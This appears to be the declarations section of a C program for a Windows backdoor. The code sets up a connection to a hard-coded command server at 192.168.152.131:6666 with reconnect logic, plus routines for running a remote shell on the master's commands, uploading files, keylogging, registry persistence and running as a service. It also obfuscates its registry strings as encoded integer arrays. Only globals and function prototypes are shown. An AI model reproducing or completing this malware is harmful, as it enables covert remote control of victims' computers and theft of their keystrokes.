#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

SOCKET Opened_Socket;

SERVICE_STATUS Service_Status;
SERVICE_STATUS_HANDLE Status_Handle;

STARTUPINFO Startup_Info;
PROCESS_INFORMATION Process_Information;




int Max_Retries = 20;
int Connection_Retries = 0;
int Timeout_in_Milliseconds = 500;
int WINSOCK_INITIALIZATION = -1;
int Socket_is_Open = -1;
int Establishing_Connection = -1;
int Reconnection_Delay = 0;

bool Connection_Not_Established = true;

int ALPHABETS[] = {202, 170, 232, 168, 222, 148, 128, 138, 204, 156, 214, 136, 192, 126, 140, 150, 196, 158, 188, 166, 206, 124, 154, 208, 218, 152, 210, 146, 162, 130, 230, 216, 198, 132, 142, 134, 236, 160, 164, 194, 238, 172, 200, 220, 226, 228, 144, 190, 224, 234, 212, 174, 178}; /* hXwWrMCHiQnGcBINeRaVjAPkpOlLTDvofEJFySUdzYgqtuKbsxmZ\ */

int Encoded_Registry_Path[] = {38,32,33,45,3,19,5,17,53,53,6,9,13,5,32,49,32,33,45,53,53,4,9,11,40,32,3,49,53,53,7,46,5,5,17,11,45,20,17,5,49,9,32,11,53,53,18,46,11};

int Encoded_Registry_Value_Name[] = {6,9,13,5,32,49,32,33,45,34,40,43,17,22,46,45,32,39,25,40,19,45,17};

int ERROR_STRING[] = {36,19,9,27,17,40};

int SUCCESS_STRING[] = {38,46,13,13,17,49,49,33,46,27};

char* Server_IP = "192.168.152.131";
unsigned short Server_Port = 6666;
struct sockaddr_in Server_Address;

char Masters_Command[1024],
     Buffer[1024],
     Response_to_Master[18384];

TCHAR Execution_Path[MAX_PATH]; //Execution path of this program
DWORD Execution_Path_Length = 0;
DWORD Timeout_for_recv = 15000;


void Initialize_Windows_Console();
void Initialize_Windows_Service();
void Initialize_Winsock();
void Define_Server_Node();
void Setup_Connection();
void Confirm_Exit();
void Connect_to_Socket();
void Check_Connection();
void Reconnect();
void Draw_the_Shell();
void Fill_Bytes_With_Zero();
void Listen_to_Master();
void Run_Masters_Command();
void Get_Commands_Output();
void Send_Commands_Output();
void Initiate_Keylogger();
void Initiate_Persistance();
void Find_Programs_Execution_Path();
void Open_Registry_Key();
void Write_Value_in_Registry();
void Close_Socket();
void SEND_SUCCESS();
void SEND_ERROR();

void Service_Main(int, char **);
void Control_Handler(DWORD);

bool Upload_File();


HKEY Registry_Key;


int Masters_Command_Equal_to(char []);

char* take(char [], size_t, size_t);

char* DECIPHER(int [], size_t);

FILE *Pipe;


DWORD WINAPI KEYLOGGER();

typedef enum {SUCCESS = 0,SUCCESSFUL = true, ALWAYS = 1,FAILURE = 1, FAILED = false} STATUS;
